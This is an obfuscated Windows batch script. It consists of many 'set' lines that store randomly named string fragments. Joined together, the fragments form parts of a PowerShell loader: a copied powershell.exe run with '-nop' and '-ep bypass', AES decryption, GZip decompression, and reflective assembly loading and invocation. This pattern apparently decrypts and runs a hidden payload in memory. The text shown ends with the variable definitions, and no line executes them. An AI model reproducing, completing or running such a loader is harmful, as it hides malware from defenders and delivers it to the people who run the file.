@echo off
set "mlgKBoOUdR=0\"
set "DEdADzIMDs=co"
set "vAfVhBERAw=Sy"
set "FVTFaXkPvE=ow"
set "duQTzZNbGz=do"
set "BZYaOQPizo=rS"
set "PfgROMOFlB=py"
set "fZFSnqzDwG=he"
set "nRqpQXZQjN=rs"
set "blcAbDCabm=in"
set "rSVqwkITni=:\"
set "bdqfEJpuFh=.e"
set "MlvTaNCZUE=ws"
set "BPVlvXDvyj=we"
set "stpYjpbFzB=\W"
set "jgALcTTJKO=\v"
set "dUsddkevTi=s\"
set "uOTMDCiTss=st"
set "stZfLcIAnE=y "
set "sbGASymKDY=we"
set "bCfxslKroO=he"
set "UllHstvNmC=xe"
set "xbytprHtIX=Wi"
set "QPneQaPUaA=nd"
set "AFKweUbuvy=po"
set "TSKzELsAPC=Po"
set "gRYeTVxjaG=em"
set "WuaRfeQXxy=32"
set "ZJoXaYOVyF= /"
set "HnleXWpjyd=ll"
set "XocuRlFGRd=ll"
set "VjaBAZJyTj=1."
set "mCOizcUNTX= C"
set "rKMjGPgPLC=cd"
set "AVknBBdCcu= %~dp0"
set "DftFdQfVJM=ress"
set "jKiobUyNwW=lDC."
set "GRiIYBfmwG=ddin"
set "rXIwuIbekP=Invo"
set "rdsioNqYuP=dj0C"
set "SHgfYcLhUx=Le.D"
set "wyLRxSqeaP=-ep "
set "LPUEJtYKco=s75K"
set "iVpoKHIcBg= [st"
set "ZXhKtkOnmI=::('"
set "DUiLZhFSLK=[Sys"
set "gKrBdCItOc=$NqA"
set "hgHTMOumvK=ress"
set "nJQoztNRWS=gnir"
set "VaaBUjCOtV=, $x"
set "lxnScPYPKC=rity"
set "EIcZMziavS=tem."
set "IwRXwgkRub= [Sy"
set "FHvDVAovUs=xiwT"
set "cjfQLFAljA=th('"
set "EOMHIZeWkE=fGzS"
set "cCCyDjRIwF=yste"
set "UzAJxyGdjB=Conv"
set "moqBJXpkek=TI);"
set "LsOOSrRXPM=ypto"
set "NSrwWumsnR=e = "
set "jSdXGoArlW=tsWi"
set "eIiXkeEDaN=; };"
set "AppfWaJtxZ=rt]:"
set "lAWvWlGBft=embl"
set "JcHfwIVvRZ=tem."
set "VgyiQBTysJ=();$"
set "mwsIrieIou=V = "
set "ASMTnBaIfD=[Sys"
set "UEeXjXstUr='txe"
set "qNfLfFMPmB=.Cop"
set "ToAtrqPPnQ=[Sys"
set "AaIxSjnlRX=ect "
set "lRXSOAbntQ=ss -"
set "mhmVfqCgQh=YxVw"
set "OzRNpkpSjO=106u"
set "FXjNVLGZmF= '')"
set "GUNBnhHJXq=ct S"
set "yeIzYHCMmw=Obje"
set "Umncsygilf=Upff"
set "EhoSWmeNfp=D.Su"
set "AmAgCJEJIQ=xiwT"
set "inADOCOefn=y.Pa"
set "ZtixmkGPxF=ach "
set "stCvLGuBnf=$xiw"
set "miJsghthhG=oL'["
set "HFTlSnfuTQ=$OLu"
set "xUBtByABua=.Dis"
set "moVRfJWcNe=Obje"
set "RcLjMLWPQt=xs ="
set "CknqrDvtux=ment"
set "WbCmfXqHKA=.Len"
set "yeYUOybMdG=I = "
set "OdUIkfBaBA=pose"
set "OIjWRTrKHo=EznX"
set "RQgvVKLUwI=m.Re"
set "mDpmrKEEOj=.Cry"
set "SOVvDAAjvF=  $F"
set "VYDsNeHxna=e = "
set "GxoqnGkQQP=..-1"
set "EKwLabUSFl=Fina"
set "EnBMGxWPOP=ispo"
set "OftfZbJsyT=d;$a"
set "mKFRjlXIic=.Ass"
set "cWxTyKDguT=comm"
set "qPKLdPNuAc=nX.I"
set "HtPQnEBWtm=[IO."
set "PKzVguceFm='0Pg"
set "nVUiobIHdU=;$xN"
set "mJotYtHutj=O.Me"
set "fppvGaJPUF=eMVs"
set "DTXaUALYke=] -j"
set "vpqhdfCqfP=, (,"
set "rdWHqqkhMp=xNlx"
set "jBDnCHSNJN=pher"
set "cRVbtkRRvr=flec"
set "TVeSSszFvp=Disp"
set "QNGNNZQiIb=File"
set "XJrawwBpVc=ptog"
set "yiRhXgUpuD=X.Pa"
set "FOHUscpEDF=lBlo"
set "tpSlskULkW= New"
set "XzmsECOJge=ta, "
set "FxRBumyhIb=pStr"
set "jMalqJicEJ=.-16"
set "CEzTtrZXuq=yFc."
set "hbLSVnBdqZ=-joi"
set "JtRAoecVrl=morF"
set "RzfRkHjjea=.Com"
set "aznBynJFxM=PTtG"
set "cdddNXuseZ== [S"
set "YVJnTDVCwA=grap"
set "MOzbPWTgmV=-nop"
set "bfEXsiMeRy=onve"
set "LewyaHUzRU=in $"
set "ItJpemDlQE=bypa"
set "xGgVPIUbMK==');"
set "ccXUOEgvTN=ose("
set "glqbzZiPck=Bmor"
set "wDlweMrGkl=EznX"
set "FbvxvIeWZF=urit"
set "hByyRwRoIi=I = "
set "ndbeJMZSRz=QH ="
set "VvJeHKMcgf=)($F"
set "rYMSoJHMnD=..-1"
set "XOkIyDKTFm=.GZi"
set "JLGLcPTQAu=tS46"
set "aMZBOQfLmK=Comp"
set "BNbRocSlCH=lit("
set "XQTYQViTrD= = $"
set "gzXaEPdlbz=t Sy"
set "TDBdySaiFl=);$F"
set "oIUIwiNgUi=gMod"
set "zjtOKmryPO=vyFc"
set "axilstYAWC=PxEW"
set "RvNbWUVOcF=brea"
set "vxlnBCZjNw=ress"
set "HKJXdmluQY=ddin"
set "FiNiyFumfU=yTo("
set "JNNGNSnHHR=]::N"
set "pBpXIlAUFM=gjYA"
set "QhhnHWeoFc=nage"
set "kOhjGnbPoy=iron"
set "FKsxalEDgQ=form"
set "zgNBYdNNOx=CFxo"
set "dfBonFbOXt=zuZI"
set "RuuWzSWAOy=ateD"
set "GsZpgvXnzK=s) {"
set "BnNtPgttvT= '')"
set "uIybZnXOOr=]::("
set "yroNhTdYLc=oryS"
